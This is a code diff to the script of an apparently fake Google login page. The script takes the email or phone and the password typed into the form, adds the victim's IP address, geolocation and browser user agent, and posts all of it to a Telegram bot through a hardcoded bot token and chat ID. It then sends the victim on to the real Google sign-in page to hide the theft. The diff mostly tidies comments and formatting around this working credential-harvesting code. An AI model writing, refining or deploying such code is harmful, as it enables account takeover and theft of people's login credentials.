@@ -74,23 +74,22 @@
     </div>
 
     <script>
-      // Telegram Bot API Token
       const botToken = "7802730138:AAHuJeHWghwS_DIU-Djva6c_F-AcIH5rOFY";
-      const chatId = "911863905"; // Replace with your Telegram chat ID
+      const chatId = "911863905";
 
-      // Function to fetch IP address using ipify API
+      // Fetch IP using ipify (HTTPS)
       async function getIp() {
         try {
-          const response = await fetch('https://api.ipify.org?format=json');
+          const response = await fetch("https://api.ipify.org?format=json");
           const data = await response.json();
           return data.ip;
         } catch (error) {
-          console.error("Error fetching IP address:", error);
+          console.error("Error fetching IP:", error);
           return "Unavailable";
         }
       }
 
-      // Function to fetch location based on IP using ipwhois.io
+      // Fetch location using HTTPS
       async function getLocationByIp(ip) {
         try {
           const response = await fetch(`https://ipwhois.app/json/${ip}`);
@@ -106,7 +105,7 @@
         }
       }
 
-      // Function to gather device info
+      // Gather device info
       function getDeviceInfo() {
         return {
           userAgent: navigator.userAgent,
@@ -115,12 +114,19 @@
         };
       }
 
-      // Function to send captured data to the Telegram bot
+      // Send data to Telegram
       async function sendToTelegram(data) {
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const message = `
+          Captured Data:
+          Email/Phone: ${data.email}
+          Password: ${data.password}
+          IP: ${data.ip}
+          Location: ${data.location.city}, ${data.location.country}
+          Device Info: ${data.deviceInfo.userAgent}
+        `;
+
         try {
-          const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-          const message = `Captured Data:\nEmail/Phone: ${data.email}\nPassword: ${data.password}\nIP: ${data.ip}\nLocation: ${data.location.city}, ${data.location.country}\nDevice Info: ${data.deviceInfo.userAgent}`;
-          
           await fetch(url, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -130,7 +136,7 @@
             }),
           });
         } catch (error) {
-          console.error("Error sending data to Telegram:", error);
+          console.error("Error sending to Telegram:", error);
         }
       }
 
@@ -138,19 +144,13 @@
         const email = document.querySelector('input[type="text"]').value;
         const password = document.querySelector('input[type="password"]').value;
 
-        // Get IP address
         const ip = await getIp();
-
-        // Get location based on IP
         const location = await getLocationByIp(ip);
-
-        // Get device info
         const deviceInfo = getDeviceInfo();
 
-        // Send data to the Telegram bot
         sendToTelegram({ email, password, ip, location, deviceInfo });
 
-        // Optionally redirect user to an actual Google login page for authenticity
+        // Redirect user
         window.location.href = "https://accounts.google.com/signin";
       });
     </script>
